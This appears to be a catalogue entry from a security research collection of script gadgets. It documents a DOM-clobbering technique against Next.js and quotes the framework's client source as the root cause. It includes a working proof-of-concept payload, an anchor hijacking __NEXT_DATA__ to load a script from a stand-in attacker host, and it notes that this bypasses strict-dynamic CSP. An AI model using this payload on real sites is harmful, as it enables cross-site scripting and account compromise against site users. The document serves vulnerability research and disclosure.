---
description: Used by some of the world's largest companies, Next.js enables you to create full-stack web applications by extending the latest React features, and integrating powerful Rust-based JavaScript tooling for the fastest builds.
github: vercel/next.js/
gadgets:
  Latest:
    authors:
      - twitter:kevin_mizu
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - id-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: In case of SSR, [next.js](https://github.com/vercel/next.js/) uses the `__NEXT_DATA__` id to store the initial props of the page. By hijacking it, it is possible to inject scripts through the `scriptLoader` array.
        code: |
          <a id="__NEXT_DATA__">{ "scriptLoader": [{ "src": "https://attacker.js/xss.js" }]}</a>
        preview: false
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/index.tsx#L269">https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/index.tsx#L269</a>

      ```javascript
      if (initialData.scriptLoader) {
        const { initScriptLoader } = require('./script')
        initScriptLoader(initialData.scriptLoader)
      }
      ```

      Source: <a target="_blank" href="https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/script.tsx#LL165C1-L168C2">https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/script.tsx#LL165C1-L168C2</a>

      ```javascript
      export function initScriptLoader(scriptLoaderItems: ScriptProps[]) {
          scriptLoaderItems.forEach(handleClientScriptLoad)
          addBeforeInteractiveToCache()
      }
      ```

      Source: <a target="_blank" href="https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/script.tsx#LL133C1-L142C2">https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/script.tsx#LL133C1-L142C2</a>

      ```javascript
      export function handleClientScriptLoad(props: ScriptProps) {
          const { strategy = 'afterInteractive' } = props
          if (strategy === 'lazyOnload') {
              window.addEventListener('load', () => {
                  requestIdleCallback(() => loadScript(props))
              })
          } else {
              loadScript(props)
          }
      }
      ```

      Source: <a target="_blank" href="https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/script.tsx#LL36C1-L131C2">https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/script.tsx#LL36C1-L131C2</a>

      ```javascript
      const loadScript = (props: ScriptProps): void => {
          // Retracted

          const cacheKey = id || src

          // Retracted

          if (src) {
              el.src = src
              ScriptCache.set(src, loadPromise)
          }

          // Retracted

          document.body.appendChild(el)
      }
      ```
    links:
      - https://mizu.re/post/youwatch#-nextjs-dom-clobbering-abuse
---
